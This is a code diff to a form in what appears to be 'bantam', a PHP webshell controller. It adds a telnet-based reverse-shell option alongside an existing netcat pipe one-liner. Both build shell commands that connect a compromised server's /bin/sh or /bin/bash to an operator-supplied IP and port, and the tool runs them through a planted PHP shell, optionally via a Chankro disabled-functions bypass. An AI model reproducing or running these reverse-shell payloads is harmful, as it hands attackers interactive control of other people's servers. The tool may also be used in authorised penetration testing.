@@ -22,6 +22,7 @@ namespace bantam.Forms
              "perl",
              "netcat",
              "netcat with pipe",
+             "telnet with pipe",
              "php",
              "bash",
              "python",
@@ -78,7 +79,7 @@ namespace bantam.Forms
         }
 
         /// <summary>
-        /// 
+        /// Caveat /tmp must be writeable
         /// </summary>
         /// <param name="ip"></param>
         /// <param name="port"></param>
@@ -87,6 +88,18 @@ namespace bantam.Forms
         {
             string netcatPipe = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + ip + " " + port + " >/tmp/f";
             return netcatPipe;
+        }
+
+        /// <summary>
+        /// Caveat /tmp must be writeable
+        /// </summary>
+        /// <param name="ip"></param>
+        /// <param name="port"></param>
+        /// <returns></returns>
+        public string TelNetPipeShell(string ip, string port)
+        {
+            string telnetPipe = "rm /tmp/j;mknod /tmp/j p; telnet " + ip + " " + port + " 0</tmp/j | /bin/bash 1>/tmp/j";
+            return telnetPipe;
         }
 
         /// <summary>
@@ -191,7 +204,6 @@ namespace bantam.Forms
         private async Task PopReverseShell(string shellCode)
         {
             string phpCode = PhpBuilder.ExecuteSystemCode(shellCode, false);
-
             await Task.Run(() => WebHelper.ExecuteRemotePHP(ShellUrl, phpCode).ConfigureAwait(false));
         }
 
@@ -215,7 +227,7 @@ namespace bantam.Forms
             string ipv4 = Helper.MinifyCode(textBoxIP.Text);
 
             if (string.IsNullOrEmpty(ipv4)
-            || !Helper.IsValidIP(ipv4)) {
+            || !Helper.IsValidIPv4(ipv4)) {
                 lblStatus.Text = "Invalid ipv4...";
                 return;
             }
@@ -236,6 +248,9 @@ namespace bantam.Forms
                     break;
                 case "netcat with pipe":
                     shellCode = NetCatPipeShell(ipv4, port);
+                    break;
+                case "telnet with pipe":
+                    shellCode = TelNetPipeShell(ipv4, port);
                     break;
                 case "php":
                     shellCode = PhpShell(ipv4, port);
@@ -261,6 +276,9 @@ namespace bantam.Forms
                     shellCode = NetCatPipeShell(ipv4, port);
                     PopReverseShell(shellCode);
 
+                    shellCode = TelNetPipeShell(ipv4, port);
+                    PopReverseShell(shellCode);
+
                     shellCode = PhpShell(ipv4, port);
                     PopReverseShell(shellCode);
 
@@ -277,6 +295,11 @@ namespace bantam.Forms
 
             if (checkBoxDisabledFunctionsBypass.Checked) {
                 shellCode = Helper.EncodeBase64ToString(shellCode);
+
+                if (checkBoxLogShellCode.Checked) {
+                    LogHelper.AddShellLog(ShellUrl, "Attempted to pop chankro reverse shell with [ " + shellCode + " ] ", LogHelper.LOG_LEVEL.requested);
+                }
+
                 if (comboBoxArch.Text == "x86") {
                     PopChankroShell(Chankro32BitShell(shellCode));
                 } else if(comboBoxArch.Text == "x64") {
@@ -285,8 +308,13 @@ namespace bantam.Forms
                     lblStatus.Text = "Unknown chankro architecture vector, GUI Error";
                 }
             } else {
+                if (checkBoxLogShellCode.Checked) {
+                    LogHelper.AddShellLog(ShellUrl, "Attempted to pop reverse shell with [ " + shellCode + " ] ", LogHelper.LOG_LEVEL.requested);
+                }
+
                 PopReverseShell(shellCode);
             }
+            lblStatus.Text = "Goodluck! :D";
         }
 
         /// <summary>
